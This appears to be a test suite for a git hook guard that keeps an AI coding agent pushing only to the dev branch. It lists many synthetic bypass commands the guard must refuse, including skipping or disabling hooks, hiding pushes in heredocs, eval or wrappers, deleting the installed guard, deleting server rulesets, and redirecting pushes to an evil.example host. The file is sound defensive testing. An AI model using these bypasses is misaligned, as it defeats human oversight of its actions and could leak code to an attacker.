    'git -c push.default=matching push', 'git -c remote.origin.push=refs/heads/dev:refs/heads/claude/x push', 'git -c remote.origin.mirror=true push origin',
  ]) assert.ok(refused(command), command);
});

test('N7: pushing the current branch by substitution is dev only when the branch is provably dev', () => {
  for (const command of [
    'git push origin "$(git rev-parse --abbrev-ref HEAD)"', 'git push -u origin "$(git branch --show-current)"', 'git push origin $(git symbolic-ref --short HEAD)',
  ]) {
    assert.deepEqual(checkShellCommand(command, 'dev'), [], `${command} on dev`);
    assert.ok(refused(command, null), `${command} with an unknown branch`);
    assert.ok(refused(command, 'claude/x'), `${command} on another branch`);
  }
  for (const command of [
    'git push origin "$(git rev-parse --abbrev-ref HEAD):claude/x"', 'git push origin "$(echo claude/x)"', 'git push origin "$(git branch --show-current)-x"',
    'git push origin "$(git rev-parse --abbrev-ref HEAD)$(echo x)"', 'git push origin "$BRANCH"', 'git push origin "$(git rev-parse --abbrev-ref HEAD) "',
  ]) assert.ok(refused(command), command);
});

test('N8: the Monitor tool runs shell commands under the same policy', () => {
  const monitor = (command) => ({ tool_name: 'Monitor', tool_input: { command, description: 'watch', timeout_ms: 60000 } });
  assert.equal(checkToolUse(monitor('git push origin HEAD:claude/x'), 'dev').length, 1);
  assert.equal(checkToolUse(monitor('while true; do git branch claude/y; sleep 5; done'), 'dev').length, 1);
  assert.deepEqual(checkToolUse(monitor('tail -f app.log | grep --line-buffered ERROR'), 'dev'), []);
  assert.deepEqual(checkToolUse({ tool_name: 'Monitor', tool_input: { ws: { url: 'wss://example.com/events' }, description: 'events', timeout_ms: 60000 } }, 'dev'), []);
});

const cli = path.join(repoRoot, 'scripts/git-guard/cli.mjs');
const settings = JSON.parse(readFileSync(path.join(repoRoot, '.claude/settings.json'), 'utf8'));
const hookCommand = (event) => settings.hooks[event].flatMap((entry) => entry.hooks.map((hook) => hook.command)).find((command) => command.includes('git-guard'));

test('the Claude hook blocks (exit 2) on a violation, on a broken payload and when the guard cannot run at all', () => {
  const run = (payload) => spawnSync(process.execPath, [cli, 'claude-pre-tool-use'], {
    input: JSON.stringify(payload), encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: repoRoot },
  });
  const blocked = run({ tool_name: 'Bash', tool_input: { command: 'git push -u origin claude/beautiful-gates-c0kwj5' }, cwd: repoRoot });
  assert.equal(blocked.status, 2);
  assert.match(blocked.stderr, /origin\/dev/);
  assert.equal(run({ tool_name: 'Bash', tool_input: { command: 'git status' }, cwd: repoRoot }).status, 0);
  assert.equal(spawnSync(process.execPath, [cli, 'claude-pre-tool-use'], { input: '{', encoding: 'utf8' }).status, 2);
  const monitorBlocked = run({ tool_name: 'Monitor', tool_input: { command: 'git push origin HEAD:claude/monitor', description: 'watch', timeout_ms: 60000 }, cwd: repoRoot });
  assert.equal(monitorBlocked.status, 2, 'Monitor payload through the real hook entry point');

  // The command wired in .claude/settings.json fails closed: no guard anywhere -> exit 2, not a non-blocking error.
  const empty = mkdtempSync(path.join(tmpdir(), 'git-guard-empty-'));
  try {
    execFileSync('git', ['init', '-q', empty]);
    const result = spawnSync('sh', ['-c', hookCommand('PreToolUse')], { input: '{"tool_name":"Bash","tool_input":{"command":"git status"}}', encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: empty } });
    assert.equal(result.status, 2);
  } finally {
    rmSync(empty, { recursive: true, force: true });
  }
});

test('against a real repository: the installed guard survives old checkouts, worktrees and --git-dir, and allows normal dev work', () => {
  const work = mkdtempSync(path.join(tmpdir(), 'git-guard-'));
  try {
    const origin = path.join(work, 'origin.git');
    const clone = path.join(work, 'clone');
    const env = { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@x', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@x', GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' };
    const git = (args, cwd = clone) => spawnSync('git', args, { cwd, env, encoding: 'utf8' });
    const refusedBy = (result, pattern, label) => {
      assert.notEqual(result.status, 0, `${label} must fail`);
      assert.match(result.stderr, pattern, label);
    };
    execFileSync('git', ['init', '-q', '--bare', '-b', 'dev', origin], { env });
    execFileSync('git', ['init', '-q', '-b', 'dev', clone], { env });
    assert.equal(git(['remote', 'add', 'origin', origin]).status, 0);
    writeFileSync(path.join(clone, 'a.txt'), '1\n');
    assert.equal(git(['add', '.']).status, 0);
    assert.equal(git(['commit', '-qm', 'pre-guard']).status, 0);
    const old = git(['rev-parse', 'HEAD']).stdout.trim();
    assert.equal(git(['branch', 'legacy/x']).status, 0, 'a branch created before the guard (e.g. by a harness)');

    mkdirSync(path.join(clone, 'scripts'), { recursive: true });
    cpSync(path.join(repoRoot, 'scripts/git-guard'), path.join(clone, 'scripts/git-guard'), { recursive: true });
    cpSync(path.join(repoRoot, '.githooks'), path.join(clone, '.githooks'), { recursive: true });
    assert.equal(git(['add', '.']).status, 0);
    assert.equal(git(['commit', '-qm', 'guard']).status, 0);
    const install = spawnSync(process.execPath, ['scripts/git-guard/cli.mjs', 'install'], { cwd: clone, env, encoding: 'utf8' });
    assert.equal(install.status, 0, install.stderr);
    const hooksDir = path.join(clone, '.git', 'git-guard', 'hooks');
    assert.equal(git(['config', '--get', 'core.hooksPath']).stdout.trim(), hooksDir, 'absolute hooks path inside the git directory');
    assert.equal(git(['push', '-q', 'origin', 'dev']).status, 0, 'first push of dev');

    // repacking an existing non-dev branch is not a write; deleting it stays possible
    assert.equal(git(['pack-refs', '--all']).status, 0, 'pack-refs with a legacy branch');
    assert.equal(git(['gc', '-q']).status, 0, 'gc with a legacy branch');
    assert.equal(git(['branch', '-D', 'legacy/x']).status, 0, 'deleting a forbidden branch');

    const only = /only branch allowed/;
    for (const args of [['branch', 'claude/x'], ['checkout', '-b', 'feature/x'], ['switch', '-c', 'fix/x'], ['worktree', 'add', path.join(work, 'w0')]]) {
      refusedBy(git(args), only, args.join(' '));
    }
    refusedBy(git(['checkout', '-b', 'hotfix/y', old]), only, 'checkout -b onto a pre-guard commit');
    assert.equal(git(['symbolic-ref', 'HEAD']).stdout.trim(), 'refs/heads/dev');
    assert.equal(git(['checkout', '-q', 'dev']).status, 0);
    refusedBy(git(['checkout', '-q', '--track', 'origin/dev', '-b', 'review/z']), only, 'tracking branch');

    // an old checkout keeps the hooks (they live in the git directory)
    assert.equal(git(['checkout', '-q', old]).status, 0);
    assert.ok(!existsSync(path.join(clone, 'scripts/git-guard')), 'the old tree has no guard');
    refusedBy(git(['switch', '-c', 'x']), only, 'switch -c from an old checkout');
    refusedBy(git(['commit', '-q', '--allow-empty', '-m', 'detached']), /commits are allowed only on "dev"/, 'commit on detached HEAD');
    refusedBy(git(['push', 'origin', 'HEAD:refs/heads/x']), /pushes go only to origin\/dev/, 'push from an old checkout');
    assert.equal(git(['switch', '-q', 'dev']).status, 0);

    // a detached worktree on the old commit shares the same hooks
    const worktree = path.join(work, 'w1');
    assert.equal(git(['worktree', 'add', '-q', '--detach', worktree, old]).status, 0);
    refusedBy(git(['switch', '-c', 'x'], worktree), only, 'switch -c in a worktree');
    refusedBy(git(['commit', '-q', '--allow-empty', '-m', 'w'], worktree), /commits are allowed only on "dev"/, 'commit in a detached worktree');
    refusedBy(git(['push', 'origin', 'HEAD:refs/heads/x'], worktree), /pushes go only to origin\/dev/, 'push from a worktree');
    assert.equal(git(['worktree', 'remove', worktree]).status, 0);

    // git pointed at the repository from elsewhere keeps the same hooks
    refusedBy(git([`--git-dir=${path.join(clone, '.git')}`, 'branch', 'x'], work), only, '--git-dir');
    refusedBy(git(['-C', '.git', 'branch', 'x']), only, '-C .git');

    // decoy refs whose DWIM lookup matches the new branch's value do not let it through
    assert.equal(git(['tag', 'refs/heads/feature/c']).status, 0);
    refusedBy(git(['branch', 'feature/c']), only, 'branch behind a decoy tag');
    refusedBy(git(['fetch', '-q', '.', 'dev:refs/heads/feature/c']), only, 'fetch behind a decoy tag');
    assert.equal(git(['tag', '-d', 'refs/heads/feature/c']).status, 0);
    assert.equal(git(['update-ref', 'refs/refs/heads/feature/b', 'HEAD']).status, 0);
    refusedBy(git(['branch', 'feature/b']), only, 'branch behind a decoy ref');
    assert.equal(git(['update-ref', '-d', 'refs/refs/heads/feature/b']).status, 0);

    // rename is invisible to reference-transaction on some git versions: either it is refused, or
    // commit/push from the renamed branch are refused and verify reports it
    if (git(['branch', '-m', 'dev', 'feature/renamed']).status === 0) {
      refusedBy(git(['commit', '-q', '--allow-empty', '-m', 'r']), /commits are allowed only on "dev"/, 'commit on a renamed branch');
      refusedBy(git(['push', 'origin', 'feature/renamed']), /pushes go only to origin\/dev/, 'push of a renamed branch');
      refusedBy(spawnSync(process.execPath, [path.join(hooksDir, '..', 'cli.mjs'), 'verify'], { cwd: clone, env, encoding: 'utf8' }), /not refs\/heads\/dev/, 'verify after rename');
      assert.equal(git(['branch', '-m', 'feature/renamed', 'dev']).status, 0);
    }
    assert.equal(git(['symbolic-ref', 'HEAD']).stdout.trim(), 'refs/heads/dev');

    // pushes
    refusedBy(git(['push', 'origin', 'dev:refs/heads/claude/beautiful-gates-c0kwj5']), /pushes go only to origin\/dev/, 'push to another branch');
    assert.equal(git(['tag', 'v1']).status, 0);
    refusedBy(git(['push', 'origin', 'v1']), /pushes go only to origin\/dev/, 'tag push');
    assert.equal(git(['ls-remote', '--heads', '--tags', 'origin']).stdout.trim().split('\n').length, 1, 'origin only has dev');

    // normal work on dev
    writeFileSync(path.join(clone, 'a.txt'), '2\n');
    assert.equal(git(['commit', '-qam', 'second']).status, 0);
    assert.equal(git(['push', '-q', 'origin', 'HEAD:dev']).status, 0);
    assert.equal(git(['rev-parse', 'dev'], origin).stdout.trim(), git(['rev-parse', 'HEAD']).stdout.trim());
    const verify = spawnSync(process.execPath, ['scripts/git-guard/cli.mjs', 'verify'], { cwd: clone, env, encoding: 'utf8' });
    assert.equal(verify.status, 0, verify.stderr);

    // a replace ref/graft cannot pass a rewritten dev off as a fast-forward
    const published = git(['rev-parse', 'HEAD']).stdout.trim();
    assert.equal(git(['reset', '-q', '--soft', 'HEAD~1']).status, 0);
    assert.equal(git(['commit', '-qm', 'rewritten']).status, 0);
    const rewritten = git(['rev-parse', 'HEAD']).stdout.trim();
    assert.equal(git(['replace', '--graft', rewritten, published]).status, 0);
    refusedBy(git(['push', 'origin', 'dev']), /not an ancestor/, 'push of a grafted rewrite');
    assert.equal(git(['replace', '-d', rewritten]).status, 0);
    assert.equal(git(['reset', '-q', '--hard', published]).status, 0);

    // an older installer pointing core.hooksPath at the in-tree .githooks: the shims still run the
    // installed guard, and the Claude hook puts the absolute hooks path back
    assert.equal(git(['config', 'core.hooksPath', '.githooks']).status, 0);
    refusedBy(git(['branch', 'drift/x']), only, 'branch with the fallback shims');
    const repair = spawnSync(process.execPath, ['scripts/git-guard/cli.mjs', 'claude-pre-tool-use'], {
      cwd: clone, env: { ...env, CLAUDE_PROJECT_DIR: clone }, encoding: 'utf8', input: '{"tool_name":"Read","tool_input":{"file_path":"a.txt"}}',
    });
    assert.equal(repair.status, 0, repair.stderr);
    assert.equal(git(['config', '--get', 'core.hooksPath']).stdout.trim(), hooksDir, 'hooks path repaired');

    // invoked through a symlinked path, the CLI still runs (and still blocks)
    const link = path.join(work, 'link');
    symlinkSync(clone, link);
    const viaLink = spawnSync(process.execPath, [path.join(link, 'scripts/git-guard/cli.mjs'), 'verify'], { cwd: clone, env, encoding: 'utf8' });
    assert.equal(viaLink.status, 0, viaLink.stderr);
    assert.match(viaLink.stdout, /OK:/);
    const blockedViaLink = spawnSync(process.execPath, [path.join(link, 'scripts/git-guard/cli.mjs'), 'claude-pre-tool-use'], {
      cwd: clone, env: { ...env, CLAUDE_PROJECT_DIR: link }, encoding: 'utf8', input: '{"tool_name":"Bash","tool_input":{"command":"git checkout -b claude/x"}}',
    });
    assert.equal(blockedViaLink.status, 2, blockedViaLink.stderr);
    const writeViaLink = spawnSync(process.execPath, [path.join(link, 'scripts/git-guard/cli.mjs'), 'claude-pre-tool-use'], {
      cwd: link, env: { ...env, CLAUDE_PROJECT_DIR: link }, encoding: 'utf8', input: JSON.stringify({ tool_name: 'Write', tool_input: { file_path: path.join(link, '.git', 'config') }, cwd: link }),
    });
    assert.equal(writeViaLink.status, 2, 'Write into .git through a symlinked project path');

    // restoring a tracked file deleted in the work tree is not a branch checkout
    rmSync(path.join(clone, 'a.txt'));
    const restore = spawnSync(process.execPath, ['scripts/git-guard/cli.mjs', 'claude-pre-tool-use'], {
      cwd: clone, env: { ...env, CLAUDE_PROJECT_DIR: clone }, encoding: 'utf8', input: JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'git checkout a.txt' }, cwd: clone }),
    });
    assert.equal(restore.status, 0, restore.stderr);
    assert.equal(git(['checkout', '--', 'a.txt']).status, 0);

    // a tampered installed guard is reported, and install restores the committed version
    appendFileSync(path.join(clone, '.git', 'git-guard', 'policy.mjs'), '\n// tampered\n');
    refusedBy(spawnSync(process.execPath, ['scripts/git-guard/cli.mjs', 'verify'], { cwd: clone, env, encoding: 'utf8' }), /policy\.mjs differs/, 'verify after tampering');
    assert.equal(spawnSync(process.execPath, ['scripts/git-guard/cli.mjs', 'install'], { cwd: clone, env, encoding: 'utf8' }).status, 0);
    assert.equal(spawnSync(process.execPath, ['scripts/git-guard/cli.mjs', 'verify'], { cwd: clone, env, encoding: 'utf8' }).status, 0);
  } finally {
    rmSync(work, { recursive: true, force: true });
  }
});

test('the guard stays wired: fallback shims, Claude hooks fail closed, CI runs these tests, the detector scans every branch', () => {
  for (const hook of ['pre-commit', 'pre-merge-commit', 'pre-push', 'reference-transaction']) {
    const file = path.join(repoRoot, '.githooks', hook);
    assert.ok(statSync(file).mode & 0o111, `${hook} shim must be executable`);
    assert.match(readFileSync(file, 'utf8'), /--git-common-dir\)\/git-guard\/cli\.mjs" (pre-commit|pre-merge-commit|pre-push|reference-transaction)/, hook);
  }
  assert.match(hookCommand('SessionStart'), /scripts\/git-guard\/cli\.mjs.* session-start$/);
  const preToolUse = hookCommand('PreToolUse');
  assert.match(preToolUse, /git-guard\/cli\.mjs.* claude-pre-tool-use \|\| exit 2$/);
  assert.match(preToolUse, /--git-common-dir/, 'prefers the installed guard');
  const matcher = settings.hooks.PreToolUse.find((entry) => JSON.stringify(entry).includes('claude-pre-tool-use')).matcher;
  for (const tool of ['Bash', 'Monitor', 'Edit', 'Write', 'MultiEdit', 'EnterWorktree', 'Agent', 'mcp__Claude_Code_Remote__create_session', 'mcp__github__create_branch', 'mcp__github__push_files']) {
    assert.match(tool, new RegExp(`^(?:${matcher})$`), `matcher covers ${tool}`);
  }
  assert.match(readFileSync(path.join(repoRoot, '.github/workflows/ci.yml'), 'utf8'), /node --test scripts\/git-guard\/policy\.test\.mjs/);
  const detector = readFileSync(path.join(repoRoot, '.github/workflows/branch-policy.yml'), 'utf8');
  assert.match(detector, /branches-ignore: \[dev\]/);
  assert.match(detector, /schedule:/);
  assert.match(detector, /repos\/\$REPO\/branches/);
});

// ─── SEC1: tokenizer / command-position bypasses (find-ca8c180d, find-75c9d608, find-254f96ee) ───
// Synthetic command strings only: the policy function never runs them.
const BAD_PUSHES = [
  'git push --no-verify origin dev',
  'git -c core.hooksPath=/dev/null push origin dev',
  'git push --force origin dev',
  'git push origin feature/x',
];

test('SEC1-a: a heredoc inside $(…) with an apostrophe or stray paren does not hide later commands', () => {
  const heredocs = [
    'msg=$(cat <<EOF\ndon\'t panic\nEOF\n)',
    'msg=$(cat <<EOF\nit\'s (fine\nEOF\n)',
    'msg=$(cat <<EOF\nstray ) paren\nEOF\n)',
    'msg=$(cat <<\'EOF\'\ndon\'t "panic\nEOF\n)',
    'git commit -m "$(cat <<EOF\nfix: don\'t break\nEOF\n)"',
    'git commit -m "$(cat <<\'EOF\'\nfix: don\'t break (really\nEOF\n)"',
  ];
  for (const head of heredocs) {
    for (const bad of BAD_PUSHES) {
      assert.equal(refused(`${head}\n${bad}`), true, `${head} / ${bad}`);
      assert.equal(refused(`${head} && ${bad}`), true, `${head} && ${bad}`);
      assert.equal(refused(`${head}; ${bad}`), true, `${head}; ${bad}`);
    }
  }
  // unterminated region that mentions git: fails closed
  assert.equal(refused('x=$(cat <<EOF\ndon\'t\ngit push origin dev'), true);
  assert.equal(refused('echo $(git status\ngit push --no-verify origin dev'), true);
});

test('SEC1-a: regressions: legitimate commands with heredoc messages stay allowed', () => {
  assert.equal(refused('git commit -m "$(cat <<\'EOF\'\nfix: don\'t break the build (really)\n\nCo-Authored-By: x\nEOF\n)"'), false);
  assert.equal(refused('git commit -m "$(cat <<EOF\nfix: don\'t break\nEOF\n)"'), false);
  assert.equal(refused('git commit -F - <<EOF\nit\'s fine (ok\nEOF'), false);
  assert.equal(refused('git commit -m "$(cat <<\'EOF\'\nmsg\nEOF\n)" && git push origin dev'), false);
  assert.equal(refused('git push origin dev'), false);
  assert.equal(refused('git push'), false);
});

test('SEC1-b: commands after if/then/elif/else/do/while/until/!/{ are inspected', () => {
  for (const bad of BAD_PUSHES) {
    const shapes = [
      `if true; then ${bad}; fi`,
      `if ! ${bad}; then echo x; fi`,
      `if false; then :; elif true; then ${bad}; fi`,
      `if false; then :; else ${bad}; fi`,
      `for i in 1 2 3; do ${bad} && break; done`,
      `while ! ${bad}; do sleep 1; done`,
      `until ${bad}; do sleep 1; done`,
      `while true; do ${bad}; done`,
      `! ${bad}`,
      `{ ${bad}; }`,
      `{ ${bad}\n}`,
      `( ${bad} )`,
      `for i in 1 2 3; do\n  ${bad} && break\n  sleep 2\ndone`,
      `retry() { ${bad}; }; retry`,
      `function retry { ${bad}; }`,
      `case x in x) ${bad};; esac`,
      `time ${bad}`,
      `if true\nthen\n  ${bad}\nfi`,
      `until ${bad}\ndo\n sleep 1\ndone`,
    ];
    for (const shape of shapes) assert.equal(refused(shape), true, shape);
  }
  assert.equal(refused('send_pack_marker=1; if true; then git send-pack origin dev; fi'), true);
  assert.equal(refused('for i in 1 2 3; do git send-pack origin refs/heads/dev && break; done'), true);
  assert.equal(refused('while ! git push origin dev; do sleep 2; done'), false);
  assert.equal(refused('for i in 1 2 3; do git push origin dev && break; sleep 2; done'), false);
  assert.equal(refused('if git push origin dev; then echo ok; else echo fail; fi'), false);
});

test('SEC1-c: gh, sh -c and eval are inspected in any command position (env assignments, wrappers, paths)', () => {
  const ghBad = [
    'gh issue develop 12',
    'gh api -X POST repos/o/r/git/refs -f ref=refs/heads/x -f sha=abc',
    'gh pr create --fill',
  ];
  const prefixes = [
    'GH_PAGER=cat ',
    'GH_PAGER=cat GH_NO_UPDATE_NOTIFIER=1 ',
    'timeout 30 ',
    'timeout -s KILL 30 ',
    'env ',
    'env -i ',
    'env FOO=bar ',
    '/usr/bin/env ',
    'nice -n 10 ',
    'command ',
    'exec ',
    'sudo ',
    'sudo -u root ',
    'nohup ',
    'xargs ',
    'if true; then ',
    'while true; do ',
    '! ',
    '{ ',
    'time ',
    'FOO=1 timeout 5 env BAR=2 ',
  ];
  for (const bad of ghBad) {
    for (const prefix of prefixes) assert.equal(refused(`${prefix}${bad}`), true, `${prefix}${bad}`);
    assert.equal(refused(`/usr/bin/${bad}`), true, `/usr/bin/${bad}`);
  }
  const nested = [
    'git push --no-verify origin dev',
    'git -c core.hooksPath=/dev/null push origin dev',
    'git push origin feature/x',
  ];
  for (const inner of nested) {
    const shells = [
      `sh -c "${inner}"`,
      `bash -c '${inner}'`,
      `bash -lc '${inner}'`,
      `/usr/bin/env sh -c "${inner}"`,
      `env bash -c "${inner}"`,
      `env -i FOO=1 sh -c "${inner}"`,
      `timeout 10 sh -c "${inner}"`,
      `timeout 10 bash -c "${inner}"`,
      `nice -n 5 sh -c "${inner}"`,
      `command sh -c "${inner}"`,
      `exec sh -c "${inner}"`,
      `sudo sh -c "${inner}"`,
      `sudo -u root bash -c "${inner}"`,
      `FOO=1 sh -c "${inner}"`,
      `if true; then sh -c "${inner}"; fi`,
      `while true; do /bin/bash -c "${inner}"; done`,
      `xargs -I{} sh -c "${inner}"`,
      `eval "${inner}"`,
      `env eval "${inner}"`,
      `FOO=1 eval "${inner}"`,
      `timeout 5 eval "${inner}"`,
      `command eval "${inner}"`,
      `if true; then eval "${inner}"; fi`,
      `sh -c "sh -c \\"${inner}\\""`,
      `eval "eval '${inner}'"`,
      `echo '${inner}' | sh`,
      `echo '${inner}' | bash -s`,
      `sh <<EOF\n${inner}\nEOF`,
    ];
    for (const shape of shells) assert.equal(refused(shape), true, shape);
  }
  assert.equal(refused('GH_PAGER=cat gh issue list'), false);
  assert.equal(refused('timeout 30 gh api repos/o/r/git/refs/heads/dev'), false);
  assert.equal(refused('timeout 30 gh pr view 3'), false);
  assert.equal(refused('/usr/bin/env sh -c "git push origin dev"'), false);
  assert.equal(refused('env FOO=1 bash -c "git status"'), false);
});

test('SEC1-d: more wrappers and deferred/dynamic execution are inspected (fail closed)', () => {
  const bad = 'git push --no-verify origin dev';
  const shapes = [
    `function retry { ${bad}; }`,
    `function retry\n{\n  ${bad}\n}`,
    `retry() { ${bad}; }`,
    `trap '${bad}' EXIT`,
    `trap "${bad}" EXIT INT`,
    `env -S "${bad}"`,
    `env --split-string="${bad}"`,
    `env -iS "${bad}"`,
    `su -c "${bad}"`,
    `su root -c "${bad}"`,
    `script -qc "${bad}" /dev/null`,
    `busybox sh -c "${bad}"`,
    `. /dev/stdin <<EOF\n${bad}\nEOF`,
    `source /dev/stdin <<EOF\n${bad}\nEOF`,
    `. <(echo "${bad}")`,
    `bash -c "$(echo '${bad}')"`,
    `eval "$(echo '${bad}')"`,
    `g=git; $g push --no-verify`,
    `g=git; "\${g}" push --no-verify`,
    `$(echo git) push --no-verify`,
    // ANSI-C quoting must not desynchronise the quote tracking
    `echo $'\\'' ; ${bad} ; echo $'\\''`,
    `echo $'it\\'s' ; ${bad}`,
    // heredoc/backtick/nested substitution shapes with contractions
    `echo \`cat <<EOF\nit's\nEOF\n\`; ${bad}`,
    `x=$(cat <<EOF\n$(echo it's)\nEOF\n); ${bad}`,
    `x=$(cat <<A\n$(cat <<B\nit's\nB\n)\nA\n); ${bad}`,
    `x=$(cat <<EOF\nit's\nEOF); ${bad}`,
    `cat <<EOF; ${bad}\nbody\nEOF`,
    `cat <<A <<B\n1\nA\n2\nB\n${bad}`,
  ];
  for (const shape of shapes) assert.equal(refused(shape), true, shape);
  // regressions: ordinary shapes stay allowed
  const allowed = [
    'cd "$(git rev-parse --show-toplevel)" && git push origin dev',
    '"$(git rev-parse --show-toplevel)/scripts/x.sh"',
    '$CLAUDE_PROJECT_DIR/.claude/hooks/x.sh',
    'trap "rm -f /tmp/x" EXIT; git push origin dev',
    'env -S "git status"',
    'su -c "ls"',
    'function retry { git push origin dev; }; retry',
    'echo $\'it\\\'s\'; git status',
    'x=$(cat <<EOF\nit\'s\nEOF\n); git push origin dev',
    'source ./env.sh && git push origin dev',
    'git commit -m "$(cat <<\'EOF\'\nit\'s (ok\nEOF\n)"',
  ];
  for (const shape of allowed) assert.equal(refused(shape), false, shape);
});

// SEC2 (independent review S3-1..S3-10): synthetic strings only, nothing is executed.
const mustRefuse = (shapes) => shapes.forEach((shape) => assert.equal(refused(shape), true, shape));
const mustAllow = (shapes) => shapes.forEach((shape) => assert.equal(refused(shape), false, shape));

test('S3-1: option words after -c do not hide the command text of a shell', () => {
  mustRefuse([
    'bash -c -l "git push -f"',
    'bash -c -x "git push -f"',
    'sh -c -e -x "git push --force origin dev"',
    'bash -c -o pipefail "git push -f"',
    'bash -c -- "git push -f"',
    'bash -c -l -- "git push -f"',
    'bash -lc "git push -f"',
  ]);
  mustAllow(['bash -c -l "git status"', 'bash -c -o pipefail "git push origin dev"', 'sh -c "ls"']);
});

test('S3-2: commands git runs on the caller\'s behalf are checked (bisect run, submodule foreach, difftool, rebase -x)', () => {
  mustRefuse([
    'git bisect run sh -c "git push -f"',
    'git bisect run sh -c "git push --no-verify origin dev"',
    'git bisect run git push -f',
    'git submodule foreach "git push -f"',
    'git submodule foreach --recursive "git checkout -b x"',
    'git difftool --extcmd="git push -f" HEAD~1',
    'git difftool --extcmd "git push -f"',
    'git difftool -x"git push -f"',
    'git rebase -x"git push -f" HEAD~2',
    'git rebase -xgit\\ push\\ -f HEAD~2',
    'git rebase -i -x "git push -f" HEAD~2',
    'git rebase --exec="git push -f" HEAD~2',
  ]);
  mustAllow([
    'git bisect run npm test',
    'git bisect run ./scripts/check.sh',
    'git submodule foreach "git status"',
    'git difftool --extcmd=vimdiff HEAD~1',
    'git rebase -x"npm test" HEAD~2',
    'git rebase -i HEAD~2',
  ]);
});

test('S3-3: gh api with an attached method (-XPOST, -XDELETE, -XPATCH) is a write', () => {
  mustRefuse([
    'gh api repos/o/r/git/refs -XPOST',
    'gh api -XPOST repos/o/r/git/refs -f ref=refs/heads/x -f sha=abc',
    'gh api -XDELETE repos/o/r/git/refs/heads/dev',
    'gh api -XPATCH repos/o/r/git/refs/heads/dev -f sha=abc',
    'gh api --method=DELETE repos/o/r/git/refs/heads/dev',
  ]);
  mustAllow(['gh api repos/o/r/pulls', 'gh api -XGET repos/o/r/git/refs', 'gh api -X GET repos/o/r/branches']);
});

test('S3-4: gh alias set/import cannot smuggle a forbidden gh command', () => {
  mustRefuse([
    'gh alias set pf "pr create" && gh pf',
    'gh alias set x "api -X POST repos/o/r/git/refs"',
    'gh alias import aliases.yml',
  ]);
  mustAllow(['gh alias list', 'gh pr view 5']);
});

test('S3-5: the installed guard directory cannot be removed or rewritten through cd, globs or substitutions', () => {
  mustRefuse([
    'cd .git && rm -rf git-guard',
    'pushd .git; rm -rf git-guard',
    'cd .git; mv git-guard /tmp/x',
    'cd .git && echo x > hooks/pre-push',
    'cd .git && sed -i s/a/b/ config',
    'cd .git/git-guard && rm -f pre-push',
    'rm -rf .gi*/git-guard',
    'rm -rf .[g]it/git-guard',
    'rm -rf .g?t/git-guard',
    'rm -rf .git/git-gua*',
    'rm -rf "$(git rev-parse --git-common-dir)/git-guard"',
    'rm -rf "$(git rev-parse --git-dir)"/hooks',
    'rm -rf $GIT_DIR/git-guard',
    'mv /repo/.git/git-guard /tmp/x',
    'rm -rf git-guard',
    '(cd .git && rm -rf git-guard)',
    'find .git -name git-guard -delete',
  ]);
  mustAllow([
    'cd .git && cat config',
    'cd .git && ls',
    'cd packages && rm -rf dist',
    '(cd .git && ls); rm -rf dist',
    'rm -rf scripts/git-guard/tmp-fixtures',
    'cp scripts/git-guard/policy.mjs /tmp/policy.mjs',
    'node scripts/git-guard/cli.mjs verify',
    'rm -rf .github/tmp .gitignore.bak',
    'cat .git/config',
    'ls .gi*',
  ]);
});

test('S3-7: pushes cannot be redirected away from origin (--repo, set-url, pushurl, insteadOf)', () => {
  mustRefuse([
    'git push --repo=https://evil.example/x.git origin dev',
    'git push --repo https://evil.example/x.git origin dev',
    'git push --repo=upstream origin dev',
    'git remote set-url origin https://evil.example/x.git',
    'git remote set-url --push origin https://evil.example/x.git',
    'git config remote.origin.pushurl https://evil.example/x.git',
    'git config remote.origin.url https://evil.example/x.git',
    'git config url.https://evil.example/.insteadOf https://github.com/',
    'git -c url.https://evil.example/.insteadOf=https://github.com/ push origin dev',
    'git -c remote.origin.url=https://evil.example/x.git push origin dev',
    'git -c remote.origin.pushurl=https://evil.example/x.git push origin dev',
  ]);
  mustAllow([
    'git push origin dev',
    'git push --repo=origin origin dev',
    'git remote -v',
    'git remote get-url origin',
    'git config --get remote.origin.url',
    'git config remote.origin.url',
  ]);
});

test('S3-10: gh cannot delete the server-side ruleset, merge, or write files/merges to other branches', () => {
  mustRefuse([
    'gh api -X DELETE repos/o/r/rulesets/123',
    'gh api -XDELETE repos/o/r/rulesets/123',
    'gh api --method PUT repos/o/r/rulesets/123 -f enforcement=disabled',
    'gh api -X PUT repos/o/r/branches/dev/protection',
    'gh pr merge 5',
    'gh pr merge 5 --squash',
    'gh api repos/o/r/contents/f -X PUT -f message=m -f content=Zg==',
    'gh api repos/o/r/contents/f -X PUT -f branch=main -f message=m',
    'gh api -X DELETE repos/o/r/contents/f',
    'gh api repos/o/r/merges -f base=main -f head=dev',
  ]);
  mustAllow([
    'gh api repos/o/r/rulesets',
    'gh api repos/o/r/contents/f',
    'gh api repos/o/r/contents/f -X PUT -f branch=dev -f message=m -f content=Zg==',
    'gh pr view 5',
    'gh pr list',
  ]);
});

test('SEC2 regressions: ordinary dev workflow stays allowed', () => {
  mustAllow([
    'git push origin dev',
    'git push',
    'git status && git diff',
    'git commit -m "it\'s a fix"',
    'git commit -m "$(cat <<\'EOF\'\nfix: it\'s fine (really)\n\nCo-Authored-By: someone\nEOF\n)"',
    'git commit -F - <<\'EOF\'\ndon\'t panic\nEOF',
    'cd "$(git rev-parse --show-toplevel)" && git push origin dev',
    'git fetch origin && git log --oneline -5',
    'bash -c "git status"',
    'git bisect start && git bisect good && git bisect bad',
  ]);
});
